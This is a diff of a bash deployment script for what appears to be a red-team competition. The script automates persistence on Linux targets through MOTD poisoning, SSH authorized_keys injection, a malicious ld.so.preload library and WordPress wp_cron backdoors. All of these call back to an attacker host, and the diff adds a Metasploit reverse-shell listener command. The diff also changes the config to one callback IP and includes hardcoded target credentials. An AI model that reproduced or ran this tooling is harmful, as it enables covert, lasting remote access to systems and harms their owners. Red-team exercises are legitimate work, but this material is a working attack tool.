@@ -9,13 +9,13 @@ set -uo pipefail
 #   ./deploy.sh
 #
 # Fill in the CONFIG section before running. This script will:
-#   1. Compile the ld.so.preload shared library locally (once, using LHOST_LDPRELOAD)
+#   1. Compile the ld.so.preload shared library locally (once, using LHOST)
 #   2. For each target:
 #       a. SCP toolkit files to /var/tmp/.dconf/
-#       b. Install MOTD persistence        (callbacks -> LHOST_MOTD)
+#       b. Install MOTD persistence        (callbacks -> LHOST)
 #       c. Inject SSH authorized_keys
-#       d. Install ld.so.preload           (callbacks -> LHOST_LDPRELOAD)
-#       e. If tagged :wordpress — install wp_cron (callbacks -> LHOST_WPCRON)
+#       d. Install ld.so.preload           (callbacks -> LHOST)
+#       e. If tagged :wordpress — install wp_cron (callbacks -> LHOST)
 #       f. Clean up /var/tmp/.dconf/
 #
 # Target tagging:
@@ -32,8 +32,6 @@ set -uo pipefail
 # ── CONFIG — fill these in on comp day ───────────────────────────────────────
 
 TARGETS=(
-     "192.168.75.129"
-     "192.168.75.132:wordpress"
 #    "10.10.10.101"
 #    "10.10.10.102"             # svc-redis-01
 #    "10.10.10.103"             # svc-database-01
@@ -48,13 +46,10 @@ TARGETS=(
 TARGET_USER="target"
 TARGET_PASS="targetvm"
 
-# Per-mechanism callback hosts — need to coordinate with before comp
-# Each should be a different red-kali IP
-LHOST_MOTD="192.168.75.130"        # teammate owning motd listener
-LHOST_LDPRELOAD="192.168.75.130"   # teammate owning ld_preload listener
-LHOST_WPCRON="192.168.75.130"      # teammate owning wp_cron listener (amazin-01 only)
+# Attacker machine IP — all callbacks connect here
+LHOST="10.10.10.160"
 
-LPORT="4444"   # ALL LISTENERS MUST USE SAME PORT
+LPORT="4444"
 
 SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdfRaX3m4g2IxRAU13/phGVXk4cZqcB0Y1FHCCaz4hW chris@kali"
 
@@ -93,8 +88,8 @@ if [[ -z "$TARGET_USER" || -z "$TARGET_PASS" || -z "$SSH_PUBKEY" ]]; then
     exit 1
 fi
 
-if [[ -z "$LHOST_MOTD" || -z "$LHOST_LDPRELOAD" || -z "$LHOST_WPCRON" ]]; then
-    error "CONFIG is incomplete — fill in LHOST_MOTD, LHOST_LDPRELOAD, and LHOST_WPCRON"
+if [[ -z "$LHOST" ]]; then
+    error "CONFIG is incomplete — fill in LHOST"
     exit 1
 fi
 
@@ -139,12 +134,12 @@ run_scp() {
 
 # ── Step 1: Compile .so locally ───────────────────────────────────────────────
 #
-# The .so has LHOST_LDPRELOAD baked in at compile time — compile once here
+# The .so has LHOST baked in at compile time — compile once here
 # rather than per-target since the callback host is the same for all targets.
 
-info "Compiling ld.so.preload shared library (LHOST=${LHOST_LDPRELOAD})..."
+info "Compiling ld.so.preload shared library (LHOST=${LHOST})..."
 
-if LHOST="$LHOST_LDPRELOAD" LPORT="$LPORT" bash "${SCRIPT_DIR}/ld_gen.sh"; then
+if LHOST="$LHOST" LPORT="$LPORT" bash "${SCRIPT_DIR}/ld_gen.sh"; then
     success "Compiled: ${SO_FILE}"
 else
     error "Compilation failed — ld.so.preload will not be deployed on any target"
@@ -180,7 +175,7 @@ for ENTRY in "${TARGETS[@]}"; do
     info "[${TARGET}] Transferring toolkit files..."
 
     TRANSFER_FILES=("${BASE_TOOLKIT[@]}")
-    [[ -n "$SO_FILE" ]]          && TRANSFER_FILES+=("$SO_FILE")
+    [[ -n "$SO_FILE" ]]            && TRANSFER_FILES+=("$SO_FILE")
     [[ "$HAS_WORDPRESS" == true ]] && TRANSFER_FILES+=("${WP_TOOLKIT[@]}")
 
     if run_ssh "$TARGET" "mkdir -p ${REMOTE_DIR} && chmod 700 ${REMOTE_DIR}" && \
@@ -198,10 +193,10 @@ for ENTRY in "${TARGETS[@]}"; do
 
     # ── MOTD persistence ──────────────────────────────────────────────────
 
-    info "[${TARGET}] Installing MOTD persistence (-> ${LHOST_MOTD}:${LPORT})..."
+    info "[${TARGET}] Installing MOTD persistence (-> ${LHOST}:${LPORT})..."
 
     if run_ssh_sudo "$TARGET" \
-        "LHOST='${LHOST_MOTD}' LPORT='${LPORT}' bash ${REMOTE_DIR}/motd_poison.sh"; then
+        "LHOST='${LHOST}' LPORT='${LPORT}' bash ${REMOTE_DIR}/motd_poison.sh"; then
         success "[${TARGET}] MOTD installed"
         RESULT_MOTD[$TARGET]="OK"
     else
@@ -224,7 +219,7 @@ for ENTRY in "${TARGETS[@]}"; do
     # ── ld.so.preload ─────────────────────────────────────────────────────
 
     if [[ -n "$SO_FILE" ]]; then
-        info "[${TARGET}] Installing ld.so.preload (-> ${LHOST_LDPRELOAD}:${LPORT})..."
+        info "[${TARGET}] Installing ld.so.preload (-> ${LHOST}:${LPORT})..."
 
         if run_ssh_sudo "$TARGET" \
             "bash ${REMOTE_DIR}/ld_install.sh"; then
@@ -242,10 +237,10 @@ for ENTRY in "${TARGETS[@]}"; do
     # ── wp_cron (wordpress targets only) ─────────────────────────────────
 
     if [[ "$HAS_WORDPRESS" == true ]]; then
-        info "[${TARGET}] Installing wp_cron persistence (-> ${LHOST_WPCRON}:${LPORT})..."
+        info "[${TARGET}] Installing wp_cron persistence (-> ${LHOST}:${LPORT})..."
 
         if run_ssh "$TARGET" \
-            "LHOST='${LHOST_WPCRON}' LPORT='${LPORT}' bash ${REMOTE_DIR}/wp_cron.sh"; then
+            "LHOST='${LHOST}' LPORT='${LPORT}' bash ${REMOTE_DIR}/wp_cron.sh"; then
             success "[${TARGET}] wp_cron installed"
             RESULT_WPCRON[$TARGET]="OK"
         else
@@ -287,7 +282,5 @@ for ENTRY in "${TARGETS[@]}"; do
 done
 echo "============================================================"
 echo ""
-info "Callback listeners needed:"
-info "  MOTD      : nc -lvnp ${LPORT}  # on ${LHOST_MOTD}"
-info "  LD_PRELOAD: nc -lvnp ${LPORT}  # on ${LHOST_LDPRELOAD}"
-info "  WP_CRON   : nc -lvnp ${LPORT}  # on ${LHOST_WPCRON}"
+info "Start listener on ${LHOST} before triggering callbacks:"
+info "  msfconsole -q -x \"use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set ExitOnSession false; run -j\""
